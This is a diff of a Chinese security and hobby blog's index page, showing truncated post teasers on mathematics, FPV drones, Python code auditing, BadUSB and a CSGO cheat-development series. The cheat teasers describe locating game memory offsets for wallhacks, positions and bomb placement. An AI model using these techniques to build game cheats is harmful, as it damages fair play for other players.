+ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/154.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数与映射"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射">函数与映射</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-07T15:58:53.000Z" title="发表于 2022-12-07 23:58:53">2022-12-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T06:23:39.110Z" title="更新于 2023-03-13 14:23:39">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+映射
+定义：XXX、YYY 非空集合, 法则 fff , 对 XXX 中每个元素 xxx  。唯一的yyy  与之对应, f:X→Yf: X \rightarrow Yf:X→Y
+三要素：XXX 原像、fff 映射、RfR_{f}Rf​ 值域
+x∈Xx \in Xx∈X对应的yyy是唯一的 , Rf⊂YRf≠YR_{f} \subset Y R_{f} \neq YRf​⊂YRf​​=Y
 
 
 
@@ -453,11 +486,11 @@ $x \in X$对应的$y$是唯一的 , $R{f} \subset Y R{f} \neq Y$
 
 
 满射
-$R_{f} =  Y$
+Rf=YR_{f} =  YRf​=Y
 
 
 单射
-$x{1} \neq x{2}, f\left(x{1}\right) \neq f\left(x{2}\right)$
+x1≠x2,f(x1)≠f(x2)x_{1} \neq x_{2}, f\left(x_{1}\right) \neq f\left(x_{2}\right)x1​​=x2​,f(x1​)​=f(x2​)
 
 
 一一映射
@@ -465,33 +498,38 @@ $x{1} \neq x{2}, f\left(x{1}\right) \neq f\left(x{2}\right)$
 
 
 逆映射
-设$f: X \rightarrow Y$ 单射 , 每个 $y \in R_{f}$  都有唯一的 $x \in X$
+设f:X→Yf: X \rightarrow Yf:X→Y 单射 , 每个 y∈Rfy \in R_{f}y∈Rf​  都有唯一的 x∈Xx \in Xx∈X
 
 
 复合映射
-$f[g(x)]$
+f[g(x)]f[g(x)]f[g(x)]
 
 
 
-
-函数函数的概念定义：设数集$  D \subset \mathbf{R}$ , 则称映射$ f: D \rightarrow \mathbf{R}$ 为定义在$ D$ 上的函数记为$ \underline {y=f(x), x \in D}$
-其中$x$称为自变量,$y$ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/10/24/FPV/" title="FPV笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/151.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="FPV笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/10/24/FPV/" title="FPV笔记">FPV笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T13:01:07.000Z" title="发表于 2022-10-24 21:01:07">2022-10-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/">无人机</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/">无人机配件</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+函数
+函数的概念
+定义：设数集$  D  ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/10/24/FPV/" title="FPV笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/151.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="FPV笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/10/24/FPV/" title="FPV笔记">FPV笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T13:01:07.000Z" title="发表于 2022-10-24 21:01:07">2022-10-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/">无人机</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/">无人机配件</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 随便几张图的，一些选配笔记
 穿越机的分类
+
 按尺寸分类
+
 进阶
+
 构成图
-飞塔飞塔是由飞控和电调这两个部分组成的。其核心设备是飞控，全称为飞行控制器，顾名思义，飞控属于飞机的控制系统，你可以把它理解为飞机的大脑，控制着飞机的动力系统（电机、电调、电池、螺旋桨）和图像传输系统（摄像头、图传、接收设备）的正常运作。
+
+飞塔
+飞塔是由飞控和电调这两个部分组成的。其核心设备是飞控，全称为飞行控制器，顾名思义，飞控属于飞机的控制系统，你可以把它理解为飞机的大脑，控制着飞机的动力系统（电机、电调、电池、螺旋桨）和图像传输系统（摄像头、图传、接收设备）的正常运作。
 
 电调的话有分四合一电调和分体电调。四合一电调的话是合在一个板块上的，方便焊接。而分体电调是有多个（主要看你又几个桨叶），一个电调控制一个桨叶
 
-两层塔、三层塔有什么区别？对于新手来说，直接选择飞塔可能会是一个比较省事儿的操作。因为一般来说，同一个厂牌的产品会有比较好的适配性和稳定性，装机的过程也会更加容易。由于机架的类型、空间的区别，飞塔通常会有两层塔和三层塔两种选择。
-两层塔一般指的是飞控和电调的组合，适用于机架空间较大的花飞机架；三层塔一般指的是飞控+电调+图传的组合，适用于机架空间比较紧凑的竞速机架。
-选多大 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/09/22/Python/" title="代码审计笔记（Python）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/150.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="代码审计笔记（Python）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/09/22/Python/" title="代码审计笔记（Python）">代码审计笔记（Python）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-22T15:58:53.000Z" title="发表于 2022-09-22 23:58:53">2022-09-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+两层塔、三层塔有什么区别？
+对于新手来说，直接选择飞塔可能会是一个比较省事儿的操作。因为一般来说，同一个厂牌的产品会有比较好的适配性和稳定性，装机的过程也会更加容易。由于机架的类型、空间的区别，飞塔通常会有两层塔和三层塔两种选择。
+两层塔一般指的是飞控和电调的组合，适用于机架空间较大的花飞机架；三层塔一般指的是飞控+电调+图传的组合，适用于机架空间比较紧凑的竞速机 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/09/22/Python/" title="代码审计笔记（Python）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/150.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="代码审计笔记（Python）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/09/22/Python/" title="代码审计笔记（Python）">代码审计笔记（Python）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-22T15:58:53.000Z" title="发表于 2022-09-22 23:58:53">2022-09-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -499,28 +537,36 @@ $f[g(x)]$
 收拾收拾下自己，发现好久没有学习了，上半年状态真的好差，之前学习也静不下心来
 从比较简单的语言开始学习，看看能不能有啥好东西
 
-命令执行标准库危险模块# 处理标记的都是通用的import osimport subprocessimport commands  # 仅限于python2import timeitimport platformimport sys# 直接输入shell命令,以ifconfig举例os.system(&#x27;ifconfig&#x27;)os.popen(&#x27;ifconfig&#x27;)commands.getoutput(&#x27;ifconfig&#x27;)  # 仅限于python2commands.getstatusoutput(&#x27;ifconfig&#x27;)  # 仅限于python2platform.popen(&#x27;dir&#x27;).rea ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/149.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="简单的BadUSB"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB">简单的BadUSB</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-14T15:58:53.000Z" title="发表于 2022-07-14 23:58:53">2022-07-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.871Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/BadUSB/">BadUSB</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+命令执行
+标准库危险模块
+# 处理标记的都是通用的import osimport subprocessimport commands  # 仅限于python2import timeitimport platformimport sys# 直接输入shell命令,以ifconfig举例os.system(&#x27;ifconfig&#x27;)os.popen(&#x27;ifconfig&#x27;)commands.getoutput(&#x27;ifconfig&#x27;)  # 仅限于python2commands.getstatusoutput(&#x27;ifconfig&#x27;)  # 仅限于python2platform.popen(&#x27;dir&#x27;).r ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/149.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="简单的BadUSB"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB">简单的BadUSB</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-14T15:58:53.000Z" title="发表于 2022-07-14 23:58:53">2022-07-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.871Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/BadUSB/">BadUSB</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-背景知识HID（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。
+背景知识
+HID（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。
 PS：和之前制作的树莓派监听类似，只是这次的更加小巧
 准备工作
+
+
 单片机（Arduino Leonardo）
+
 
 Arduino
 
 
-初始化首先我们安装好Arduino后需要把我们的单片机连接上，然后选择端口
+初始化
+首先我们安装好Arduino后需要把我们的单片机连接上，然后选择端口
 
 以及我们的开发板
 
 需要选着好这两个参数才能上传编辑，接着我们能看到两个函数
 void setup() &#123;  // put your setup code here, to run once:&#125;void loop() &#123;  // put your main code here, to run repeatedly:&#125;
 setup这个函数是单片机通电后执行的内容
-loop是通电结束后 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/148.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(八)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)">CSGO破解学习(八)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-19T15:58:53.000Z" title="发表于 2022-05-19 23:58:53">2022-05-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+loop是 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/148.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(八)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)">CSGO破解学习(八)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-19T15:58:53.000Z" title="发表于 2022-05-19 23:58:53">2022-05-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-透视看到CS的显示模式是通过OpenGL来做到的，这个是微软官方的动态链接库
+透视
+看到CS的显示模式是通过OpenGL来做到的，这个是微软官方的动态链接库
 
 作为图形硬件的软件接口，OpenGL 的主要用途是将二维和三维对象呈现为框架缓冲区。 这些对象被描述为顶点序列，这些顶点 (定义几何对象) 或像素 (定义图像) 。 OpenGL 对此数据执行多个过程，以将其转换为像素，以在帧缓冲区中形成最终所需的图像。
 以下主题演示 OpenGL 工作原理的全局视图：
@@ -533,17 +579,19 @@ OpenGL 函数名称描述 OpenGL 中使用的命名约定。
 
 我们只需要关注两个函数
 
-openGL32.dll -&gt; glB ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/147.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(七)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)">CSGO破解学习(七)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-12T15:58:53.000Z" title="发表于 2022-05-12 23:58:53">2022-05-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+openGL32.dll -&gt; gl ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/147.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(七)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)">CSGO破解学习(七)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-12T15:58:53.000Z" title="发表于 2022-05-12 23:58:53">2022-05-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-分析游戏的结构体首先我们拿出我们之前的基地址进行结构体分析
+分析游戏的结构体
+首先我们拿出我们之前的基地址进行结构体分析
 
 然后往下拉找到7C 这个位置
 
 打开有这些结构体，我们一个一个的点开看，7C的00便宜没有什么数据，但是04偏移打开竟然看到了我们的指针
 
 那么X坐标的真实偏移应该是cstrike.exe+11069BC+7C+04+08，而不是cstrike.exe+11069BC+88，那么我们就可以印证了上一篇的猜想
-查找准心指向我们首先新建一个未知的扫描（新建的时候需要把准心对着墙壁），然后把准心对着自己队友后选择变化了，然后移到墙上搜索变化了，往复搜索最终会得到
+查找准心指向
+我们首先新建一个未知的扫描（新建的时候需要把准心对着墙壁），然后把准心对着自己队友后选择变化了，然后移到墙上搜索变化了，往复搜索最终会得到
 
 这些数据，然后我们在跑到敌人的位置，把准心对着敌人然后在搜索变化了
 
@@ -551,29 +599,33 @@ openGL32.dll -&gt; glB ...</div></div></div><div class="recent-post-item"><div c
 
 可以看到一个值还是2，而一个值变成了6，那么我们就根据之前搜索到的数据来判断，09E1DBD8这个是阵营，09E1DBDC是敌人编号，然后我们看之前的偏移值
 
-和上面的偏移相差不大，所以就得到了下面的 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/146.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(六)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)">CSGO破解学习(六)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-27T15:58:53.000Z" title="发表于 2022-04-27 23:58:53">2022-04-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+和上面的偏移相差不大，所以就得到了下 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/146.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(六)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)">CSGO破解学习(六)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-27T15:58:53.000Z" title="发表于 2022-04-27 23:58:53">2022-04-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
-获取手雷地址首先需要找到手雷的基地址，通过买手雷，然后丢了，然后在买进行搜索
+获取手雷地址
+首先需要找到手雷的基地址，通过买手雷，然后丢了，然后在买进行搜索
 
 然后在基地址中筛选最终的值为0583D9F8接着找基地址，右键查看什么修改了它
 
 可以看到这个值和我们之前的不太一样，它是ecx+eax*4+000005F8 也就是说0583D3D0+C*4+5F8，算出结果是0583D3D0+628，接着使用结构体的方式来确认数值
 
 为什么上图的地址是18B19630而不是0583D3D0了是因为我切换了地图
-猜测以及思考通过找了这么多的数据，我们可以进行一下分析，大概可以猜测一下人物的结构体
+猜测以及思考
+通过找了这么多的数据，我们可以进行一下分析，大概可以猜测一下人物的结构体
 
 cstrike.exe+11069BC+7c存放的是整个人物的基址
 cstrike.exe+11069BC+7c+4存放的关于游戏内人物具体属性的具体地址
 cstrike.exe+11069BC+7c+5F0 存放的是使用武器的地址
 
-我们通过猜测结构体，来到具体的内存位置，对人物进行操作，然后对内存进行观察，可以发现 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/145.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(五)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)">CSGO破解学习(五)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-24T15:58:53.000Z" title="发表于 2022-04-24 23:58:53">2022-04-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.805Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+我们通过猜测结构体，来到具体的内存位置，对人物进行操作，然后对内存进行观察，可以 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/145.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(五)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)">CSGO破解学习(五)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-24T15:58:53.000Z" title="发表于 2022-04-24 23:58:53">2022-04-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.805Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前置
+
 CSGO版本更改为v3248（对之前版本的基地址进行了修改）
 
-获取自己和敌人坐标首先站在平面上搜索单浮点
+获取自己和敌人坐标
+首先站在平面上搜索单浮点
 
 然后在最低点的石头上搜索增加的值
 
@@ -600,22 +652,24 @@ CSGO版本更改为v3248（对之前版本的基地址进行了修改）
 然后验证下
 
 切记要等他指针变成不是你自己地址的时候去修改他
-随时下包首先搜索未知地址然后进入到下包点
+随时下包
+首先搜索未知地址然后进入到下包点
 
